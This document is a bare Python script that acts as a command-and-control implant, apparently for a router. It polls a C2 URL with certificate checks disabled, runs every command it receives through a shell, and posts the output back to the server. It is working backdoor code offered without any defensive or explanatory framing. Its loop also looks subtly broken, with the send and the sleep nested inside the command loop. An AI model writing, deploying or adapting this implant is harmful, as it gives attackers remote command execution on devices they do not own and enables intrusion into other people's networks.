import requests
import time
import subprocess

c2_url = "https://localhost/command"
device_name = "router_ac8v4"

def get_commands():
  try:
    response = requests.get(c2_url, params={"device_name": device_name}, verify=False)
    if response.status_code == 200:
      return response.json()
    else:
      return []
  except Exception as e:
    print(f"Error getting commands: {e}")
    return []

def execute_command(command):
    try:
      output = subprocess.check_output(command, shell=True)
      return output.decode()
    except subprocess.CalledProcessError as e:
      return str(e)

def send_results(results):
    try:
      requests.post(c2_url, json={"device_name": device_name, "results": results}, verify=False)
    except Exception as e:
      print(f"Error sending results: {e}")

while True:
  commands = get_commands()
  results = []
  for command in commands:
    result = execute_command(command)
    results.append({"command": command, "result": result})
    if results:
      send_results(results)
      time.sleep(60)
